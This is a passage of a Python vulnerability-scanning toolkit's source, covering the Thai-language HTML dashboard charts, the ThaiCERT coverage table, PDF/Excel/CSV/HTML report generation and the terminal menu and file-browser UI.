      ipMap[ip].count += 1;
    });
    const ipList = Object.values(ipMap).sort((a,b) => (b.vuln - a.vuln) || (b.score - a.score) || (b.count - a.count));
    const topIPs = ipList.slice(0, 6);
    const otherIPs = ipList.slice(6);
    const hasAnyVuln = ipList.some(x => x.vuln > 0);
    const otherVal = otherIPs.reduce((acc, x) => acc + (hasAnyVuln ? x.vuln : x.count), 0);
    const ipLabels = topIPs.map(x => x.ip);
    const ipData = topIPs.map(x => hasAnyVuln ? x.vuln : x.count);
    const ipColors = hasAnyVuln
      ? ['#c0392b','#d35400','#e67e22','#2980b9','#8e44ad','#0d9488']
      : ['#2980b9','#0d9488','#8e44ad','#10b981','#f59e0b','#6b7280'];
    if(otherVal > 0){
      ipLabels.push('IP อื่นๆ (' + otherIPs.length + ' IPs)');
      ipData.push(otherVal);
      ipColors.push('#6b7280');
    }
    window._topIPs = topIPs.map(x => x.ip);
    window.CHARTS.donutIP.data.labels = ipLabels;
    window.CHARTS.donutIP.data.datasets[0].data = ipData;
    window.CHARTS.donutIP.data.datasets[0].backgroundColor = ipColors;
    window.CHARTS.donutIP.update();
  }

  // 3. ch-donut-sev
  if(window.CHARTS.donutSev){
    const sevCounts = { Critical: 0, High: 0, Medium: 0, Low: 0, Info: 0 };
    const impactSevFinds = filteredFindings.filter(f => f.bucket === 'vulnerable' || f.bucket === 'warning');
    const sevTargetFinds = (F.bucket === 'all' && impactSevFinds.length > 0)
      ? impactSevFinds
      : filteredFindings;
    sevTargetFinds.forEach(f => {
      const s = f.sev || 'Info';
      if(sevCounts[s] !== undefined) sevCounts[s]++;
      else sevCounts.Info++;
    });
    const sLbl = [], sData = [], sColors = [];
    const sevCols = { Critical: '#c0392b', High: '#d35400', Medium: '#f39c12', Low: '#2980b9', Info: '#6b7280' };
    ['Critical', 'High', 'Medium', 'Low', 'Info'].forEach(k => {
      if(sevCounts[k] > 0){
        sLbl.push(k);
        sData.push(sevCounts[k]);
        sColors.push(sevCols[k]);
      }
    });
    window._sevLabels = sLbl;
    window.CHARTS.donutSev.data.labels = sLbl;
    window.CHARTS.donutSev.data.datasets[0].data = sData;
    window.CHARTS.donutSev.data.datasets[0].backgroundColor = sColors;
    window.CHARTS.donutSev.update();
  }

  // 4. ch-bar-cat
  if(window.CHARTS.barCat){
    const catMap = {};
    const impactCatFinds = filteredFindings.filter(f => f.bucket === 'vulnerable' || f.bucket === 'warning');
    const catTargetFinds = (F.bucket === 'all' && impactCatFinds.length > 0)
      ? impactCatFinds
      : filteredFindings;
    catTargetFinds.forEach(f => {
      const c = f.cat || 'Other';
      catMap[c] = (catMap[c] || 0) + 1;
    });
    const catE = Object.keys(catMap).map(k => ({ k: k, v: catMap[k] })).filter(e => e.v > 0).sort((a,b) => b.v - a.v).slice(0, 8);
    const catCols = ['#2980b9','#1abc9c','#9b59b6','#e67e22','#e74c3c','#16a085','#8e44ad','#d35400'];
    window._catLabels = catE.map(e => e.k);
    window.CHARTS.barCat.data.labels = catE.map(e => e.k);
    window.CHARTS.barCat.data.datasets[0].data = catE.map(e => e.v);
    window.CHARTS.barCat.data.datasets[0].backgroundColor = catE.map((_, i) => catCols[i % catCols.length]);
    window.CHARTS.barCat.update();
  }

  // 5. ch-donut-tech
  if(window.CHARTS.donutTech){
    const srvMap = {};
    filteredHosts.forEach(h => {
      let s = (h.server || 'Unknown').trim();
      if(!s) s = 'Unknown';
      srvMap[s] = (srvMap[s] || 0) + 1;
    });
    const srvList = Object.keys(srvMap).map(k => ({ k: k, v: srvMap[k] })).sort((a,b) => b.v - a.v);
    const topSrv = srvList.slice(0, 5);
    const otherSrv = srvList.slice(5).reduce((acc, x) => acc + x.v, 0);
    const srvLabels = topSrv.map(x => x.k);
    const srvData = topSrv.map(x => x.v);
    const srvColors = ['#1d4ed8','#0284c7','#0d9488','#10b981','#f59e0b'];
    if(otherSrv > 0){
      srvLabels.push('อื่นๆ');
      srvData.push(otherSrv);
      srvColors.push('#6b7280');
    }
    window._srvLabels = topSrv.map(x => x.k);
    window.CHARTS.donutTech.data.labels = srvLabels;
    window.CHARTS.donutTech.data.datasets[0].data = srvData;
    window.CHARTS.donutTech.data.datasets[0].backgroundColor = srvColors;
    window.CHARTS.donutTech.update();
  }

  // 6. ch-bar-status
  if(window.CHARTS.barStatus){
    let vuln = 0, warn = 0, unk = 0, safe = 0;
    filteredFindings.forEach(f => {
      if(f.bucket === 'vulnerable') vuln++;
      else if(f.bucket === 'warning') warn++;
      else if(f.bucket === 'unknown') unk++;
      else if(f.bucket === 'safe') safe++;
    });
    window.CHARTS.barStatus.data.datasets[0].data = [vuln, warn, unk, safe];
    window.CHARTS.barStatus.update();
  }

  // 7. ch-bar-hosts
  if(window.CHARTS.barHosts){
    const topH = filteredHosts.slice().sort((a,b) => (b.score || 0) - (a.score || 0)).slice(0, 15);
    const hColors = topH.map(h => {
      const lv = h.level || '';
      return lv === 'critical' ? '#c0392b' : lv === 'warning' ? '#d35400' : lv === 'unknown' ? '#6b7280' : '#1e7e34';
    });
    window._topHosts = topH.map(h => h.host);
    window.CHARTS.barHosts.data.labels = topH.map(h => h.host || '?');
    window.CHARTS.barHosts.data.datasets[0].data = topH.map(h => Math.round(h.score || 0));
    window.CHARTS.barHosts.data.datasets[0].backgroundColor = hColors;
    window.CHARTS.barHosts.update();
  }

  // 8. ch-hist-cvss
  if(window.CHARTS.histCvss){
    const bins = new Array(10).fill(0);
    filteredFindings.forEach(f => {
      if(f.bucket === 'safe'){
        // ตามมาตรฐาน CVSS v3.1: 0.0 = None (ปลอดภัย / ไม่พบช่องโหว่)
        bins[0]++;
      } else if(f.bucket === 'vulnerable' || f.bucket === 'warning'){
        const sc = parseFloat(f.cvss != null ? f.cvss : f.base_cvss || 0);
        bins[Math.min(9, Math.max(1, Math.floor(sc)))]++;
      }
    });
    window.CHARTS.histCvss.data.datasets[0].data = bins;
    window.CHARTS.histCvss.update();
  }

  // 9. ch-stacked
  if(window.CHARTS.stacked){
    const sortedS = filteredHosts.slice().sort((a,b) => ((b.vulnerable || 0) + (b.warning || 0)) - ((a.vulnerable || 0) + (a.warning || 0))).slice(0, 10);
    const activeS = sortedS.filter(h => (h.vulnerable || 0) + (h.warning || 0) > 0);
    const topS = activeS.length > 0 ? activeS : sortedS;
    window._topStacked = topS.map(h => h.host);
    window.CHARTS.stacked.data.labels = topS.map(h => h.host || '?');
    window.CHARTS.stacked.data.datasets[0].data = topS.map(h => h.vulnerable || 0);
    window.CHARTS.stacked.data.datasets[1].data = topS.map(h => h.warning || 0);
    window.CHARTS.stacked.update();
  }
}

function init(){
  const s = D.stats, v = D.verdict;
  document.getElementById('sub').textContent =
    `เป้าหมาย: ${D.target}  ·  วันที่สแกน: ${(''+D.scan_date).slice(0,19).replace('T',' ')}`;
  document.getElementById('vh').textContent = v.headline;
  document.getElementById('vd').textContent = v.detail;

  renderThaiCERT8();
  initCharts();
  updateAll();
}

// ── ตารางความครอบคลุม 8 กลุ่มระบบ ThaiCERT (คิดจาก DATA ทั้งหมด ไม่ขึ้นกับตัวกรอง) ──
function tc8Esc(s){ return (''+s).replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c])); }

function renderThaiCERT8(){
  const tc = (D.thaicert || []);
  if(!tc.length) return;
  const avg = Math.round(tc.reduce((a,x)=>a+x.cap,0)/tc.length);
  const isLan = !!(tc[0] && tc[0].lan);
  const avgRemote = Math.round(tc.reduce((a,x)=>a+(x.cap_remote!=null?x.cap_remote:x.cap),0)/tc.length);
  const cap = document.getElementById('tc8-cap');
  if(cap) cap.innerHTML = 'จับคู่สิ่งที่ตรวจพบเข้ากับ 8 กลุ่มระบบของ ThaiCERT/NCSA · ' +
    (isLan
      ? '<b style="background:#e7f5ff;color:#1864ab;padding:1px 7px;border-radius:10px;font-size:11px">🏠 โหมด LAN</b> ' +
        'ความสามารถเฉลี่ย ≈ <b style="color:var(--ink)">'+avg+'%</b> ' +
        '<span style="color:var(--muted)">(ภายนอกจะได้ '+avgRemote+'%)</span> · '
      : 'ความสามารถเฉลี่ยในการตรวจจากภายนอก ≈ <b style="color:var(--ink)">'+avg+'%</b> · ') +
    '<span style="color:var(--muted)">คลิกแต่ละกลุ่มเพื่อดูรายละเอียด (drill-down)</span>';
  const thd = document.getElementById('tc8-thd');
  if(thd) thd.innerHTML = '<tr>'+
    '<th style="text-align:left;width:26px"></th>'+
    '<th style="text-align:left">กลุ่มระบบ</th>'+
    '<th style="width:180px">ความสามารถตรวจ'+(isLan?' (LAN)':' (ภายนอก)')+'</th>'+
    '<th style="text-align:left;width:220px">พบในสแกนนี้</th>'+
    '<th style="text-align:left">ขอบเขต / จุดอ่อน</th></tr>';
  const barColor = p => p>=70 ? 'var(--safe)' : (p>=45 ? 'var(--warn)' : 'var(--vuln)');
  const esc = tc8Esc;
  const LCm = (typeof LC!=='undefined') ? LC : {};
  const LTm = (typeof LT!=='undefined') ? LT : {};
  const rows = tc.map(x=>{
    const found = x.hosts
      ? '<b style="color:var(--ink)">'+x.hosts+' โฮสต์</b>' +
        (x.items && x.items.length ? '<br><span style="color:var(--muted);font-size:11px">'+esc(x.items.slice(0,4).join(', '))+'</span>' : '')
      : '<span style="color:var(--muted)">— ไม่พบ</span>';
    const hasDetail = (x.detail && x.detail.length);
    // แถวกลุ่ม (คลิกได้)
    const head = '<tr class="tc8-row" style="cursor:pointer" onclick="togTC8('+x.no+')">'+
      '<td style="text-align:center;color:var(--muted)"><span id="tc8arr_'+x.no+'">▸</span></td>'+
      '<td><b>'+x.no+'. '+esc(x.name)+'</b><br><span style="color:var(--muted);font-size:11px">ตัวอย่าง: '+esc(x.ex)+'</span></td>'+
      '<td><div style="display:flex;align-items:center;gap:8px">'+
        '<div style="flex:1;height:8px;background:#eef1f6;border-radius:5px;overflow:hidden">'+
          '<div style="width:'+x.cap+'%;height:100%;background:'+barColor(x.cap)+'"></div></div>'+
        '<span style="font-weight:700;color:var(--ink);font-size:12px;min-width:34px;text-align:right">'+x.cap+'%</span>'+
        ((isLan && x.cap_lan>x.cap_remote) ? '<span style="color:var(--safe);font-size:10px;white-space:nowrap" title="โหมด LAN เพิ่มจาก '+x.cap_remote+'%">▲'+(x.cap_lan-x.cap_remote)+'</span>' : '')+
      '</div></td>'+
      '<td>'+found+'</td>'+
      '<td style="color:#555;font-size:11.5px;line-height:1.55">'+esc(x.note)+'</td></tr>';
    // แถวรายละเอียด (ซ่อนไว้)
    let body = '';
    if(hasDetail){
      const hostCards = x.detail.map((d,idx)=>{
        const lv = d.level||'';
        const pill = lv ? '<span class="pill" style="background:'+(LCm[lv]||'#9aa0ab')+';font-size:10px">'+(LTm[lv]||lv)+'</span>' : '';
        const items = (d.items&&d.items.length) ? '<div style="color:#555;font-size:11.5px;margin-top:2px">'+esc(d.items.join(', '))+'</div>' : '';
        const cves = (d.cves&&d.cves.length)
          ? '<div style="margin-top:4px;display:flex;gap:4px;flex-wrap:wrap">'+
            d.cves.map(cv=>'<span class="pill" style="background:#e0e7ff;color:#1e3a8a;font-size:10px;cursor:pointer" onclick="filterByCVE(\''+esc(cv)+'\');event.stopPropagation()" title="กรองเมทริกซ์ด้วย '+esc(cv)+'">'+esc(cv)+'</span>').join('')+'</div>'
          : '';
        return '<div style="border:1px solid var(--line);border-radius:8px;padding:8px 10px;background:#fff">'+
          '<div style="display:flex;align-items:center;gap:8px;justify-content:space-between">'+
            '<a style="font-weight:700;color:var(--ink);cursor:pointer;text-decoration:underline" '+
              'onclick="tc8Open('+x.no+','+idx+');event.stopPropagation()" '+
              'title="เปิดรายละเอียดโฮสต์">'+esc(d.host)+'</a>'+pill+'</div>'+
          (d.ip?'<div style="color:var(--muted);font-size:11px">'+esc(d.ip)+'</div>':'')+
          items+cves+'</div>';
      }).join('');
      body = '<tr id="tc8det_'+x.no+'" style="display:none"><td></td><td colspan="4" style="background:#fbfcfe;padding:12px">'+
        '<div style="font-size:12px;font-weight:700;color:var(--ink);margin-bottom:8px">โฮสต์ที่เข้ากลุ่มนี้ ('+x.detail.length+') — คลิกชื่อโฮสต์เพื่อเปิดรายละเอียดเต็ม</div>'+
        '<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:8px">'+hostCards+'</div>'+
        '</td></tr>';
    } else {
      body = '<tr id="tc8det_'+x.no+'" style="display:none"><td></td><td colspan="4" style="background:#fbfcfe;padding:12px;color:var(--muted);font-size:12px">'+
        'ไม่พบระบบกลุ่มนี้ในการสแกนครั้งนี้ — อาจเพราะเป้าหมายไม่มีระบบกลุ่มนี้ หรืออยู่นอกเพดานการตรวจจากภายนอก ('+x.cap+'%). '+esc(x.note)+'</td></tr>';
    }
    return head + body;
  }).join('');
  const tb = document.getElementById('tc8-tb');
  if(tb) tb.innerHTML = rows;
}

function togTC8(no){
  const det = document.getElementById('tc8det_'+no);
  const arr = document.getElementById('tc8arr_'+no);
  if(!det) return;
  const open = det.style.display==='none';
  det.style.display = open ? '' : 'none';
  if(arr) arr.textContent = open ? '▾' : '▸';
}

function tc8Open(no, idx){
  const g = (D.thaicert||[]).find(x=>x.no===no);
  if(!g || !g.detail || !g.detail[idx]) return;
  openDr(g.detail[idx].host);
}

init();
</script></body></html>"""
    out = (tmpl.replace("__CHARTJS__", _CHARTJS_SRC)
               .replace("__PAYLOAD__", payload)
               .replace("__MATRIX__", matrix_html)
               .replace("__VC__", vc))
    with open(path, "w", encoding="utf-8") as f:
        f.write(out)

def run_generate_report(json_path, output_dir="reports", evidence_dir=None):
    if not HAS_REPORTLAB:
        print("  ❌ ต้องติดตั้ง reportlab: pip install reportlab")
        return None
    with open(json_path, encoding="utf-8") as f:
        jdata = json.load(f)
    data = _extract_data(jdata)
    data = _compute_stats(data)

    # B11: อ่านสรุปหลักฐาน RCE (ถ้ามีโฟลเดอร์ evidence) เพื่อนำไปแสดงในรายงาน
    if evidence_dir and Path(evidence_dir).exists():
        try:
            sp = Path(evidence_dir) / "summary.json"
            if sp.exists():
                ev = json.loads(sp.read_text(encoding="utf-8"))
                data["evidence_summary"] = {
                    "verdict": ev.get("verdict", ""),
                    "proof": (ev.get("rce_output") or ev.get("proof_type") or "")[:300],
                    "dir": str(evidence_dir)}
        except Exception:
            pass

    # สร้างโฟลเดอร์ย่อยตามวันเวลา เพื่อแยกรายงานแต่ละครั้ง
    stamp_dir = datetime.now().strftime("%Y%m%d_%H%M%S")
    out = Path(output_dir) / stamp_dir
    out.mkdir(parents=True, exist_ok=True)
    print(f"  📁 โฟลเดอร์ผลลัพธ์: {out}")

    # บันทึก JSON ต้นฉบับไว้ในโฟลเดอร์เดียวกับรายงาน
    try:
        import shutil as _shutil
        _shutil.copy(json_path, out / Path(json_path).name)
        print(f"  ✅ JSON: {out / Path(json_path).name}")
    except Exception as _je:
        print(f"  ⚠ ไม่สามารถบันทึก JSON: {_je}")

    font_path = _find_font()
    pdf_font = _register_font(font_path)
    thai = _setup_mpl_font(font_path) if HAS_MPL else False
    if HAS_MPL:
        _mpl_base_style()
    print(f"  ฟอนต์: {font_path or 'Helvetica (สำรอง)'}")

    # ชื่อไฟล์: <host ที่สะอาด>_<YYYYMMDD_HHMMSS>
    raw = data["target"].replace("https://", "").replace("http://", "")
    raw = raw.replace("*", "all").replace("/", "_").strip()
    base_name = safe_name(raw) or "report"
    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")

    charts = {}
    if HAS_MPL:
        charts_dir = out / "charts"
        charts_dir.mkdir(exist_ok=True)
        charts = {k: str(charts_dir / f"{k}_{stamp}.png")
                  for k in ["gauge", "hosts", "severity", "status", "category", "stacked",
                            "toprisk", "tophosts", "thaicert"]}
        try:
            _chart_gauge(data, charts["gauge"], thai)
            _chart_severity(data, charts["severity"], thai)
            _chart_status(data, charts["status"], thai)
            if not _chart_thaicert(data, charts["thaicert"], thai):
                charts.pop("thaicert", None)
            if not _chart_category(data, charts["category"], thai):
                charts.pop("category", None)
            if not _chart_stacked(data, charts["stacked"], thai):
                charts.pop("stacked", None)
            if not _chart_toprisk(data, charts["toprisk"], thai):
                charts.pop("toprisk", None)
            if data.get("is_multi"):
                _chart_hosts(data, charts["hosts"], thai)
                if not _chart_tophosts(data, charts["tophosts"], thai):
                    charts.pop("tophosts", None)
            else:
                charts.pop("hosts", None)
                charts.pop("tophosts", None)
        except Exception as e:
            print(f"  ⚠ สร้างกราฟผิดพลาด: {e}")

    pdf_path = unique_output_path(out, f"report_{base_name}_{stamp}", ".pdf")
    try:
        _build_pdf(data, charts, str(pdf_path), pdf_font)
        print(f"  ✅ PDF: {pdf_path}")
    except Exception as e:
        pdf_path = None
        print(f"  ⚠ สร้าง PDF ไม่สำเร็จ: {e}")

    excel_path = unique_output_path(out, f"report_{base_name}_{stamp}", ".xlsx")
    try:
        _export_excel(data, excel_path)
        print(f"  ✅ Excel (5 ชีต): {excel_path}")
    except Exception as e:
        excel_path = None
        print(f"  ⚠ สร้าง Excel ไม่สำเร็จ: {e}")

    # CSV ความครอบคลุม 8 กลุ่ม ThaiCERT — ออกเสมอ (แม้มี openpyxl) เพื่อให้มีไฟล์ CSV ใช้งานต่อ
    tc_csv_path = unique_output_path(out, f"report_{base_name}_{stamp}_thaicert", ".csv")
    try:
        _export_thaicert_csv(data, str(tc_csv_path))
        print(f"  ✅ CSV 8 กลุ่ม ThaiCERT: {tc_csv_path}")
    except Exception as e:
        tc_csv_path = None
        print(f"  ⚠ สร้าง CSV 8 กลุ่ม ไม่สำเร็จ: {e}")

    html_path = unique_output_path(out, f"dashboard_{base_name}_{stamp}", ".html")
    try:
        _build_html_dashboard(data, str(html_path))
        print(f"  ✅ HTML แดชบอร์ด: {html_path}")
    except Exception as e:
        html_path = None
        print(f"  ⚠ สร้าง HTML ไม่สำเร็จ: {e}")

    if evidence_dir and Path(evidence_dir).exists():
        ev_out_base = out / f"evidence_{base_name}"
        n, ev_out = 1, ev_out_base
        while ev_out.exists():
            n += 1
            ev_out = Path(str(ev_out_base) + f"_{n}")
        shutil.copytree(evidence_dir, ev_out)
        print(f"  ✅ Evidence: {ev_out}")

    return {"pdf": str(pdf_path) if pdf_path else None,
            "excel": str(excel_path) if excel_path else None,
            "thaicert_csv": str(tc_csv_path) if tc_csv_path else None,
            "html": str(html_path) if html_path else None,
            "out_dir": str(out)}

# ═══════════════════════════════════════════════════════════════════════
# SECTION 6 — Menu UI
# ═══════════════════════════════════════════════════════════════════════

class C:
    R = "\033[0m"; B = "\033[1m"; D = "\033[2m"
    RED = "\033[91m"; GRN = "\033[92m"; YEL = "\033[93m"
    BLU = "\033[94m"; CYN = "\033[96m"


def c(text, color): return f"{color}{text}{C.R}"


def banner():
    w = 70
    line = "═" * (w - 2)
    print()
    print(c("╔" + line + "╗", C.BLU))
    t1 = f"RMUT CERT · All-in-One Vulnerability Toolkit"
    t2 = f"v{VERSION}  —  Scan · RCE Verify · Report"
    print(c("║", C.BLU) + c(" " + t1.ljust(w - 3), C.B + C.CYN) + c("║", C.BLU))
    print(c("║", C.BLU) + c(" " + t2.ljust(w - 3), C.D) + c("║", C.BLU))
    print(c("╚" + line + "╝", C.BLU))


def section(title):
    print()
    print(c("─" * 68, C.D))
    print(f"  {c(C.B + title, C.YEL)}")
    print(c("─" * 68, C.D))


def ask(prompt, default=None, required=False, validator=None):
    hint = f" [{default}]" if default is not None else ""
    while True:
        val = input(f"  {prompt}{hint}: ").strip()
        if not val:
            if default is not None: val = str(default)
            elif required: print(c("    ❌ จำเป็น", C.RED)); continue
            else: return ""
        if validator:
            ok, err = validator(val)
            if not ok: print(c(f"    ❌ {err}", C.RED)); continue
        return val


def ask_yn(prompt, default=False):
    global _NO_INTERACTIVE
    if _NO_INTERACTIVE:
        return default
    hint = " [Y/n]" if default else " [y/N]"
    try:
        v = input(f"  {prompt}{hint}: ").strip().lower()
    except (EOFError, KeyboardInterrupt):
        return default
    if not v: return default
    return v in ("y", "yes", "ใช่", "k", "ครับ", "ค่ะ")


def ask_int(prompt, default, min_v=None, max_v=None):
    def val(v):
        try: n = int(v)
        except: return False, "ต้องเป็นตัวเลข"
        if min_v is not None and n < min_v: return False, f"ต้อง >= {min_v}"
        if max_v is not None and n > max_v: return False, f"ต้อง <= {max_v}"
        return True, ""
    return int(ask(prompt, default, validator=val))


def ask_scan_mode():
    """เมนูเลือกโหมดการสแกนตั้งแต่ต้น — คืน 'auto' | 'external' | 'lan'"""
    section("เลือกโหมดการสแกน (Scan Mode)")
    return ask_choice(
        "จะสแกนจากตำแหน่งใด?",
        [("auto", "อัตโนมัติ (แนะนำ)",
          "เปิดโหมด LAN เองเมื่อเป้าหมายเป็น IP ภายใน (192.168/10/172.16-31) ไม่งั้นใช้โหมดภายนอก"),
         ("external", "ภายนอก (External · remote unauthenticated)",
          "สแกนเสมือนจากนอกเครือข่าย — ไม่ใช้ nmap -O/ARP/MAC (เพดานความสามารถเฉลี่ย ~55%)"),
         ("lan", "เครือข่ายภายใน (LAN · internal)",
          "บังคับ nmap -O/ARP + MAC/OUI + TTL เชื่อมั่นสูง — แม่นขึ้นมากกับ NAS/กล้อง/Network/Windows "
          "(เฉพาะเป้าหมายในวง LAN เดียวกัน · เพดานเฉลี่ย ~66%)")],
        default="auto")


def _scan_mode_label(mode=None):
    """ป้ายโหมดสแกนสำหรับแสดงในเมนู/หัวข้อ"""
    m = mode or _SCAN_MODE
    return {"lan": "🏠 LAN (เครือข่ายภายใน)", "external": "🌐 ภายนอก (External)",
            "auto": "⚙️ อัตโนมัติ (auto)"}.get(m, "⚙️ อัตโนมัติ (auto)")


def ask_choice(prompt, choices, default=None):
    print(f"  {prompt}")
    print()
    for i, item in enumerate(choices, 1):
        k, lbl = item[0], item[1]
        desc = item[2] if len(item) > 2 else None
        out = item[3] if len(item) > 3 else None
        marker = c(" (default)", C.D) if k == default else ""
        print(f"    {c(str(i), C.CYN)}) {c(lbl, C.B)}{marker}")
        if desc:
            print(f"       {c('• รายละเอียด:', C.D)} {desc}")
        if out:
            print(f"       {c('• Output ที่ได้:', C.GRN)} {out}")
        if desc or out:
            print()
    if not any(len(item) > 2 for item in choices):
        print()
    while True:
        v = input(f"  เลือก [1-{len(choices)}]: ").strip()
        if not v and default: return default
        try:
            n = int(v)
            if 1 <= n <= len(choices): return choices[n-1][0]
        except: pass
        print(c("    ❌ ไม่ถูกต้อง", C.RED))


def _osascript_choose(kind, title, start_dir, exts=None):
    """เปิด dialog เนทีฟของ macOS ผ่าน osascript (จัดการโฟกัสถูกต้อง ไม่แย่งหน้าต่างอื่น)
    kind: 'file' หรือ 'folder' — คืนค่า: path (สำเร็จ), "" (ผู้ใช้กดยกเลิก), None (ใช้ไม่ได้/ผิดพลาด)"""
    if sys.platform != "darwin":
        return None
    try:
        import subprocess
        safe_title = title.replace("\\", "\\\\").replace('"', '\\"')
        loc = os.path.abspath(start_dir)
        verb = "choose folder" if kind == "folder" else "choose file"
        # ตัวกรองนามสกุล (เฉพาะ choose file) — ใส่ไว้ลองก่อน ถ้า macOS บางรุ่น error ค่อยตัดทิ้ง
        type_clause = ""
        if kind != "folder" and exts:
            quoted = ", ".join('"' + e.lstrip(".") + '"' for e in exts)
            type_clause = f" of type {{{quoted}}}"
        # default location ใส่ได้ก็ต่อเมื่อโฟลเดอร์มีอยู่จริง (ถ้า path ไม่มีจริง osascript จะ error
        # ไม่ยอมเปิดหน้าต่างเลย) — จึงเตรียมทั้งแบบมี location และแบบไม่มี (เปิดได้เสมอ) ไว้เป็น fallback
        loc_opts = ([f' default location (POSIX file "{loc}")'] if os.path.isdir(loc) else []) + [""]
        filt_opts = ([type_clause] if type_clause else []) + [""]
        # ลำดับความพยายาม: (กรอง+location) → (กรอง+ไม่มี loc) → (ไม่กรอง+location) → (ไม่กรอง+ไม่มี loc)
        # ตัวสุดท้าย "ไม่กรอง + ไม่มี location" เปิดหน้าต่างได้เสมอทุกเครื่อง/ทุกโฟลเดอร์
        choosers = []
        for fc in filt_opts:
            for lc in loc_opts:
                choosers.append(f'{verb} with prompt "{safe_title}"{lc}{fc}')
        for chooser in choosers:
            # นำหน้าด้วย `activate` เพื่อดึง dialog ขึ้นมาหน้าสุดทันที (ไม่ให้ไปซ่อนหลัง Terminal)
            # `activate` แบบ top-level ใช้สิทธิ์ของ osascript เอง ไม่ต้องขอ Automation permission
            res = subprocess.run(["osascript", "-e", "activate", "-e", f'POSIX path of ({chooser})'],
                                 capture_output=True, text=True, timeout=600)
            if res.returncode == 0 and res.stdout.strip():
                return res.stdout.strip()
            # ผู้ใช้กดยกเลิก (-128) → หยุดเลย ไม่ต้องลองสคริปต์แบบอื่นต่อ
            if "-128" in res.stderr or "−128" in res.stderr or "User canceled" in res.stderr:
                return ""
            # error อื่น (เช่น type list ใช้ไม่ได้) → วนไปลอง chooser ตัวถัดไป
        return None
    except Exception:
        return None


def _tk_choose(kind, title, start_dir, filetypes=None):
    """เปิด dialog ด้วย tkinter แบบไม่แย่งโฟกัสค้าง (ยกขึ้นหน้าชั่วคราวแล้วปล่อยคืน)
    kind: 'file' หรือ 'folder' — คืนค่า path หรือ "" (ยกเลิก/ใช้ไม่ได้)"""
    try:
        import tkinter as tk
        from tkinter import filedialog
        root = tk.Tk()
        root.withdraw()
        root.update_idletasks()
        # ยกหน้าต่างขึ้นหน้าแค่ชั่วคราว แล้วยกเลิก topmost ทันที เพื่อไม่ให้ค้างทับแอปอื่น
        root.attributes("-topmost", True)
        root.after(200, lambda: root.attributes("-topmost", False))
        if kind == "folder":
            selected = filedialog.askdirectory(parent=root, initialdir=os.path.abspath(start_dir), title=title)
        else:
            selected = filedialog.askopenfilename(
                parent=root, initialdir=os.path.abspath(start_dir), title=title,
                filetypes=filetypes or [("All files", "*.*")]
            )
        root.destroy()
        return selected or ""
    except Exception:
        return ""


def browse_file(title="เลือกไฟล์ JSON ผลการสแกน", ext=".json", start_dir="."):
    """เรียกหน้าต่าง GUI (macOS: osascript ก่อน, อื่นๆ: tkinter) หรือ interactive CLI browser เพื่อเลือกไฟล์
    ext รับได้ทั้ง str เดี่ยว (เช่น '.json') หรือ tuple/list หลายนามสกุล (เช่น ('.csv','.txt'))"""
    # รองรับหลายนามสกุล: normalize เป็นรายการ _exts
    if isinstance(ext, (list, tuple)):
        _exts = [e.lower() for e in ext if e]
    else:
        _exts = [ext.lower()] if ext else []
    _ext_label = "/".join(_exts) if _exts else "ทุกไฟล์"

    def _match_ext(p):
        return (not _exts) or (p.suffix.lower() in _exts)

    # 1. GUI File Dialog — macOS ใช้ osascript ก่อน (จัดการโฟกัสถูกต้อง), อื่นๆ ใช้ tkinter
    print(f"\n  {c('🔍 กำลังเปิดหน้าต่างเลือกไฟล์ (หรือเลือกจากรายการด้านล่าง)...', C.CYN)}")
    if _exts:
        _pat = " ".join(f"*{e}" for e in _exts)
        filetypes = [(f"{_ext_label} files", _pat), ("All files", "*.*")]
    else:
        filetypes = [("All files", "*.*")]
    # macOS: ใช้ osascript เท่านั้น (ไม่แตะ tkinter เพราะเป็นต้นเหตุหน้าต่างลอย/แย่งโฟกัส)
    # ถ้า osascript ไม่ได้ผล → ตกไปใช้ CLI browser ด้านล่าง. OS อื่นจึงใช้ tkinter
    selected = _osascript_choose("file", title, start_dir, _exts)
    if selected is None and sys.platform != "darwin":
        selected = _tk_choose("file", title, start_dir, filetypes)
    if selected and Path(selected).exists():
        print(f"  {c('✅ เลือกไฟล์:', C.GRN)} {selected}")
        return selected

    # 2. Interactive Terminal File Browser (กรณีไม่ใช้ GUI หรือกดยกเลิก GUI)
    cur_dir = Path(start_dir).resolve()
    while True:
        section(f"FILE BROWSER — {cur_dir}")
        # ค้นหาไฟล์ที่ตรงกับนามสกุลในโฟลเดอร์ปัจจุบัน (เรียงตามเวลาแก้ไขล่าสุด)
        matching_files = sorted(
            [p for p in cur_dir.iterdir() if p.is_file() and _match_ext(p)],
            key=lambda x: x.stat().st_mtime,
            reverse=True
        )
        subdirs = sorted([p for p in cur_dir.iterdir() if p.is_dir() and not p.name.startswith(".")])

        items = []
        if matching_files:
            print(f"  {c(f'📄 ไฟล์ {_ext_label} ในโฟลเดอร์นี้ (เรียงจากล่าสุด):', C.B)}")
            for f in matching_files[:25]:
                items.append(("file", f))
                idx = len(items)
                mtime = datetime.fromtimestamp(f.stat().st_mtime).strftime("%Y-%m-%d %H:%M")
                size_kb = f.stat().st_size / 1024
                print(f"    {c(str(idx), C.CYN):>12}) {c(f.name, C.GRN):<42} {c(f'({size_kb:.1f} KB | {mtime})', C.D)}")
        else:
            print(f"  {c(f'(ไม่พบไฟล์ {_ext_label} ในโฟลเดอร์นี้)', C.YEL)}")

        if subdirs:
            print(f"\n  {c('📁 โฟลเดอร์ย่อย:', C.B)}")
            for d in subdirs[:15]:
                items.append(("dir", d))
                idx = len(items)
                print(f"    {c(str(idx), C.CYN):>12}) 📁 {d.name}/")

        print(f"\n  {c('คำสั่งเพิ่มเติม:', C.B)}")
        print(f"    {c('u', C.CYN)}) ⬆️  ขึ้นไปโฟลเดอร์ก่อนหน้า (..)")
        print(f"    {c('p', C.CYN)}) ⌨️  พิมพ์ระบุ Path ของไฟล์ด้วยตนเอง")
        print(f"    {c('g', C.CYN)}) 🪟 เปิดหน้าต่าง GUI เลือกไฟล์อีกครั้ง")
        print(f"    {c('q', C.CYN)}) ❌ ยกเลิก / กลับ")
        print()

        choice = input("  เลือกหมายเลข หรือคำสั่ง [1/u/p/g/q]: ").strip()
        if not choice:
            if matching_files:
                selected = str(matching_files[0])
                print(f"  {c('✅ เลือกไฟล์ล่าสุด:', C.GRN)} {selected}")
                return selected
            continue

        low = choice.lower()
        if low == "q":
            return None
        elif low == "u":
            cur_dir = cur_dir.parent
            continue
        elif low == "g":
